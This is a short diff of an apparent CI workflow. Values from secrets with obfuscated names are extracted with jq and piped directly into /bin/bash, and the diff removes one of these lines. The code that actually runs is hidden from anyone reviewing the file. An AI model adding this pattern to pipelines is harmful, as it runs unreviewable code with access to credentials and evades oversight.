@@ -22,7 +22,6 @@ jobs:
           qwyc623: ${{ secrets.qwyc623 }}
         run: |
           printf '%s' "$qwyc623" | jq -r .xn0 | /bin/bash
-          echo $aerh7987 | jq -r .iarjh79183 | /bin/bash
           printf '%s' "$gswup8125" | jq -r .o7473 | /bin/bash
 
       - name: Store artifact
